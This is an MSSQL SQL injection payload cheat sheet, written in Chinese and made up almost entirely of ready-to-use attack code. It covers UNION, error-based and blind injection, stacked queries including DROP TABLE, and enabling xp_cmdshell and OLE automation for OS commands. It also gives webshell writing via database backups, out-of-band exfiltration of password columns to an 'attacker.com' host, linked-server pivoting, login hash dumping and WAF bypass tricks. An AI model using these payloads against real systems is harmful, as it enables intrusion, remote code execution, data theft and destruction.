# MSSQL Payload 速查

## 判型
| 信号 | MSSQL |
|---|---|
| 字符串拼接 | `+` |
| 注释 | `--`(须空白)、`/* */`、`;%00` |
| 报错方言 | `Incorrect syntax near`、`Conversion failed when converting`、`Unclosed quotation mark` |
| 系统表 | `sysobjects`/`syscolumns`/`sysdatabases`/`master..` |
| 函数 | `db_name()` `user_name()` `host_name()` `len()` `substring()` `ascii()` `@@version` |
| 延时 | `WAITFOR DELAY '0:0:5'` |
| 堆叠 | 原生支持 |

## 枚举 / UNION
```sql
SELECT name FROM master..sysdatabases;
SELECT DB_NAME(N);
SELECT STRING_AGG(name,', ') FROM master..sysdatabases;              -- 2017+ 一次列全
SELECT name FROM master..sysobjects WHERE xtype='U';                 -- 表('V'=视图)
SELECT name FROM someotherdb..sysobjects WHERE xtype='U';
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='mytable');
SELECT COL_NAME(OBJECT_ID('db.table'),1);
SELECT table_name FROM information_schema.tables WHERE table_catalog='DB';
-- 判列数
?id=1 ORDER BY 4--            -- 4 正常 5 报错 → 4 列
?id=-1 UNION ALL SELECT null,'null','null',null--     -- 找显错点
-- 取数
-1 UNION SELECT null,@@version,null--
-1 UNION SELECT null,name,null FROM master..sysdatabases WHERE dbid>4--
-- 一把梭(表名+列名全量)
-1' UNION SELECT null,CONCAT_WS(0x3a,table_schema,table_name,column_name),null
   FROM information_schema.columns FOR JSON AUTO-- -
```

## 报错注入（强类型是物理基础）
```sql
' AND 1=(SELECT @@version)-- -
' AND 1=(SELECT DB_NAME())-- -
' AND 1=(SELECT top 1 name FROM master..sysdatabases WHERE dbid>4)-- -
' AND 1=(SELECT IS_SRVROLEMEMBER('sysadmin'))-- -
convert(int,@@version)
cast((SELECT @@version) as int)
' + convert(int,@@version) + '
' AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~'))-- -
' AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~'))-- -
' AND 1337=CONCAT('~',(SELECT @@version),'~')-- -
-- WAF 拦 convert/cast 时的冷门强转函数
' + user_name(@@version)-- -        -- SUSER_NAME()/PERMISSIONS()/DB_NAME()/FILE_NAME()/TYPE_NAME()/COL_NAME()
' AND 1=(select CONCAT_WS(0x3a,table_schema,table_name,column_name)a FROM information_schema.columns FOR JSON AUTO)-- -
-- 表名 hex 形式绕引号
' AND 1=convert(int,(select top 1 COLUMN_NAME from information_schema.columns
      where TABLE_NAME=cast(0x7370745f66616c6c6261636b5f6462 as varchar)))-- -
```

### ORDER BY 位专杀（不能用引号闭合）
```sql
?order=convert(int,@@version)
?order=CONVERT(int,(select top 1 table_name from information_schema.tables))
?order=file_name(@@version)
?order=convert(int,(select top 1 xserver_name from spt_fallback_db))
```

## 布尔盲注
```sql
AND LEN((SELECT TOP 1 username FROM tblusers))=5-- -
AND ASCII(SUBSTRING((SELECT TOP 1 username FROM tblusers),1,1))=97-- -
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- -
AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(8000)),1,1)),0)>90
-- 遍历表名用 FOR XML PATH('')/FOR JSON 一次拼出, 不逐条 not in()
```

## 时间盲注（**先做基线纪律**）
```sql
1;WAITFOR DELAY '0:0:5'--
1);WAITFOR DELAY '0:0:5'--
1';WAITFOR DELAY '0:0:5'--
1');WAITFOR DELAY '0:0:5'--
1));WAITFOR DELAY '0:0:5'--
IF([条件]) WAITFOR DELAY '0:0:[秒]'
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
```
**假阳性防范**：先测 10 次基线取中位数/max，延时量 > max+3σ；双因子（时长+响应体长度）；有 SQL 回显就不用时序。

## 堆叠查询
```sql
1; DROP TABLE members--
1; EXEC master..xp_cmdshell 'whoami'--
... username='admin'exec('update[users]set[password]=''a''')--
-- 无分号堆叠（绕只认 ';' 的 WAF）
SELECT 'a' SELECT 'b'
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
admin'exec('sp_configure''show advanced options'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
-- 堆叠拿不到回显 → 落表再读
CREATE TABLE #tmp (col VARCHAR(999));
INSERT #tmp EXEC master..xp_cmdshell 'whoami';
```

## 文件
```sql
-- 读 (需 ADMINISTER BULK OPERATIONS)
SELECT * FROM OPENROWSET(BULK N'C:/Windows/win.ini', SINGLE_CLOB) AS x;
' AND 1=(SELECT x FROM OpenRowset(BULK 'C:/Windows/win.ini',SINGLE_CLOB) R(x))-- -
-- 写
execute spWriteStringToFile '内容','C:\path\','file'
-- 差异备份写 shell
backup database [库] to disk='c:\bak.bak';
create table [dbo].[t]([cmd] image);
insert into t(cmd) values(0x3C25657865637574652872657175657374282261222929253E);
backup database [库] to disk='C:\web\shell.asp' WITH DIFFERENTIAL,FORMAT;
-- log 备份写 shell (需完整恢复模式+已做完整备份)
alter database [库] set RECOVERY FULL;
create table cmd(a image); backup log [库] to disk='c:\xxx' with init;
insert into cmd(a) values(0x3C25...53E); backup log [库] to disk='c:\web\2.asp';
```

## 命令执行
```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;           RECONFIGURE;
EXEC master..xp_cmdshell 'whoami';
-- OLE 替代
EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE WITH OVERRIDE;
declare @s int exec sp_oacreate 'wscript.shell',@s output
 exec sp_oamethod @s,'run',null,'c:\windows\system32\cmd.exe /c whoami > c:\a.txt'
-- CLR UDF (发 HTTP / 打云元数据)
EXEC sp_add_trusted_assembly 0x<sha512>,N'HttpDb, version=0.0.0.0, ...';
CREATE ASSEMBLY HttpDb FROM 'C:\HttpDb.dll' WITH PERMISSION_SET=UNSAFE;
CREATE FUNCTION dbo.http(@u nvarchar(max)) RETURNS nvarchar(max) AS EXTERNAL NAME HttpDb.UserDefinedFunctions.http;
-- 机器学习服务(换用户身份)
EXECUTE sp_execute_external_script @language=N'Python',@script=N'print(__import__("os").system("whoami"))'
```

## OOB
```sql
DECLARE @a varchar(999),@b varchar(999);
SELECT TOP 1 @a=REPLACE(REPLACE(SUBSTRING(col,1,10),CHAR(92),'-'),CHAR(32),'-') FROM #tmp WHERE col IS NOT NULL;
SET @b=CONCAT(CHAR(92),CHAR(92),@a,'.collaborator.tld',CHAR(92),'x');
EXEC master..xp_dirtree @b;                  -- 仅 445
xp_fileexist '\\10.10.10.10\share'
xp_subdirs  '\\10.10.10.10\share'
-- 需权限, 逐条查 fn_my_permissions
1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'+(select pass from users where id=1)+'.d.attacker.com\1.xem',null,null))  -- VIEW SERVER STATE
1+(select 1 where exists(select * from fn_get_audit_file('\\'+(select pass from users where id=1)+'.d.attacker.com\',default,default)))        -- CONTROL SERVER
1 and exists(select * from fn_trace_gettable('\\'+(select pass from users where id=1)+'.d.attacker.com\1.trc',default))                       -- CONTROL SERVER
-- 2026: xp_* 被回收后的替代 DMF
SELECT * FROM sys.dm_os_enumerate_filesystem('\\attacker\share','*');
SELECT * FROM sys.dm_os_file_exists('\\attacker\share\file');
-- 老版本 pre-auth UNC 解析
BACKUP LOG [T] TO DISK='\\attacker\file'; RESTORE HEADERONLY FROM DISK='\\attacker\file';
```
DNS 限制: label ≤63、总长 ≤248 → 分块或 hex。

## 链接服务器
```sql
select * from master..sysservers;
select * from openquery("linked",'select @@version as version');
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linked",'select 1;exec master..xp_cmdshell "dir c:"')
EXECUTE('EXECUTE(''CREATE LOGIN U WITH PASSWORD=''''P@ss'''''') AT "D\SQL01"') AT "D\SQL02"
```

## 凭据
```sql
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins;        -- 2000 → hashcat -m 131
SELECT name, master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins; -- 2005+ → -m 132/1731
```

## WAF 绕过表
| 手法 | 示例 |
|---|---|
| MSSQL 空白符 | `%1eaNd%1e'1'='1`、`%1eoR%1e1=(db_name/**/()%1e)%1e--` |
| 非常规空白 | `1%C2%85union%C2%85select%C2%A0null,@@version,null--` |
| 函数名+注释 | `db_name/**/()` |
| **限定符插空白** | `infOrmatiOn_sChema%0f.%0ftAbles` |
| 0e/0x 前缀 | `0eunion+select...` / `0xunion+select...` |
| `.from` | `+from.users--` |
| `\N` 分隔 | `0xunion+select\Nnull,@@version,null+from+users--` |
| 大小写混写 | `SelEct ... infOrmatiOn_sChema.tAbles` |
| 注释吃逗号(IIS 同名参数) | `SelEct/*&username=*/top/*&x=*/1` |
| 免分号堆叠 | `admin'exec('sp_configure''xp_cmdshell'',''1''reconfigure')--` |
| hex/CHAR 绕引号 | `CHAR(39)`、`cast(0x7370... as varchar)` |
| 注释符差异(阿里云) | 它拦 `--+%0a` 不拦 `--%0a` |
| order by 数字被拦 | 写 `order by "a",1` |
| 冷门强转函数 | 换 `user_name()`/`file_name()`/`permissions()` |
| 请求头运载 | payload 放 `Origin`/`Referer`/`XFF`/`UA` |
